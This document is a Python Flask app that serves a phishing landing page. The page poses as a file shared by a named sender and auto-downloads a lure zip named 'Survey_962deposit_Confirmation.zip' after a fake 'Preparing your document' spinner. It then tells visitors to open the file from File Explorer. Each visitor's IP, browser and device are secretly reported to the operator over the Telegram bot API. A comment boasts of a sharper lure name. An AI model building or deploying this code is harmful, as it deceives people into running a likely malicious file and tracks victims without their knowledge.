# app.py
from flask import Flask, send_file, render_template_string, request
import os
import requests
from datetime import datetime

app = Flask(__name__)     

# ENI's touch: Updated to the sharper, highly specific lure name
FILE_NAME = 'Survey_962deposit_Confirmation.zip'
SENDER_NAME = 'Michael Biggiani'

# Telegram Configuration
TELEGRAM_BOT_TOKEN = ''  # Replace with your actual bot token
TELEGRAM_CHAT_ID = ''      # Replace with your actual chat ID

def send_telegram_notification(visitor_info):
    """Send notification to Telegram when someone visits the page"""
    try:
        message = (
            f"📥 *New File Access*\n\n"
            f"👤 *Visitor:* {visitor_info['ip']}\n"
            f"🌐 *Browser:* {visitor_info['browser']}\n"
            f"📱 *Device:* {visitor_info['device']}\n"
            f"🕐 *Time:* {visitor_info['time']}\n"
            f"📍 *Location:* {visitor_info['location']}\n\n"
            f"File: {FILE_NAME}"
        )
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        print(f"Telegram notification failed: {e}")

def get_visitor_info():
    """Extract visitor information from the request"""
    # Get IP address (handle proxies)
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr
    
    # Get user agent info
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Simple browser detection
    browser = 'Unknown'
    if 'Chrome' in user_agent:
        browser = 'Chrome'
    elif 'Firefox' in user_agent:
        browser = 'Firefox'
    elif 'Safari' in user_agent and 'Chrome' not in user_agent:
        browser = 'Safari'
    elif 'Edge' in user_agent:
        browser = 'Edge'
    
    # Simple device detection
    device = 'Desktop'
    if 'Mobile' in user_agent or 'Android' in user_agent or 'iPhone' in user_agent:
        device = 'Mobile'
    elif 'iPad' in user_agent or 'Tablet' in user_agent:
        device = 'Tablet'
    
    # Get approximate location (you can use a geolocation API for more accuracy)
    location = 'Unknown'
    
    return {
        'ip': ip,
        'browser': browser,
        'device': device,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'location': location
    }

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Document Ready</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f5f7fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            max-width: 560px;
            width: 100%;
            border-radius: 8px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
            padding: 60px 50px;
            text-align: center;
            border: 1px solid #e1e8ed;
        }

        /* Page 1 - Downloading */
        #page-downloading h1 {
            font-size: 24px;
            color: #2c3e50;
            margin-bottom: 8px;
            font-weight: 600;
        }
        #page-downloading .sender {
            font-size: 16px;
            color: #7f8c8d;
            margin-bottom: 40px;
        }
        .spinner-wrapper {
            margin: 0 auto 30px;
            width: 60px;
            height: 60px;
            position: relative;
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #ecf0f1;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status-text {
            font-size: 15px;
            color: #95a5a6;
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }

        /* Page 2 - Complete */
        #page-complete { display: none; }
        .check-circle {
            width: 80px;
            height: 80px;
            background: #27ae60;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
            animation: popIn 0.4s ease-out;
        }
        @keyframes popIn {
            0% { transform: scale(0); }
            80% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        .check-circle svg {
            width: 40px;
            height: 40px;
            fill: none;
            stroke: white;
            stroke-width: 3;
            stroke-linecap: round;
            stroke-linejoin: round;
        }
        #page-complete h1 {
            font-size: 26px;
            color: #2c3e50;
            margin-bottom: 8px;
            font-weight: 600;
        }
        #page-complete .subtitle {
            font-size: 16px;
            color: #7f8c8d;
            margin-bottom: 30px;
        }
        .info-box {
            background: #f8f9fa;
            border: 1px solid #e1e8ed;
            border-radius: 6px;
            padding: 24px;
            margin-bottom: 35px;
            text-align: left;
            font-size: 14px;
            color: #34495e;
            line-height: 1.8;
        }
        .info-box .filename {
            font-weight: 600;
            color: #2c3e50;
            font-family: 'Courier New', monospace;
        }
        .download-btn {
            display: inline-block;
            background: #3498db;
            color: white;
            padding: 14px 50px;
            text-decoration: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            transition: all 0.3s;
            border: none;
            cursor: pointer;
            margin: 5px;
            letter-spacing: 0.3px;
        }
        .download-btn:hover {
            background: #2980b9;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(52, 152, 219, 0.3);
        }
        .footer-text {
            margin-top: 30px;
            font-size: 12px;
            color: #bdc3c7;
        }
        .help-link {
            display: block;
            margin-top: 20px;
            font-size: 14px;
            color: #3498db;
            text-decoration: none;
            font-weight: 500;
        }
        .help-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">

        <!-- Page 1: Downloading -->
        <div id="page-downloading">
            <h1>{{ sender_name }}</h1>
            <p class="sender">has sent you a file</p>
            <div class="spinner-wrapper">
                <div class="spinner"></div>
            </div>
            <p class="status-text">Preparing your document...</p>
        </div>

        <!-- Page 2: Complete -->
        <div id="page-complete">
            <div class="check-circle">
                <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
            </div>
            <h1>Download Complete</h1>
            <p class="subtitle">Your file is ready.</p>
            
            <div class="info-box">
                Find <span class="filename">{{ filename }}</span> in Recent (File Explorer) and open it to view your document. Download manually.
            </div>
            
            <a href="/download" class="download-btn">↻ Restart and Download</a>
            
            <a href="mailto:support@example.com" class="help-link">Get Help</a>
            
            <p class="footer-text">Secure file sharing</p>
        </div>

    </div>

    <script>
        // Wait 3 seconds on the downloading page, then switch to complete
        setTimeout(function() {
            document.getElementById('page-downloading').style.display = 'none';
            document.getElementById('page-complete').style.display = 'block';
            // Trigger automatic download
            window.location.href = '/download';
        }, 3000);
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    if not os.path.exists(FILE_NAME):
        return "File not found. Please ensure the file is uploaded to the server.", 404
    
    # Send Telegram notification when someone visits the page
    visitor_info = get_visitor_info()
    send_telegram_notification(visitor_info)
    
    return render_template_string(HTML_TEMPLATE,
                                sender_name=SENDER_NAME,
                                filename=FILE_NAME)

@app.route('/download')
def download():
    return send_file(FILE_NAME, as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
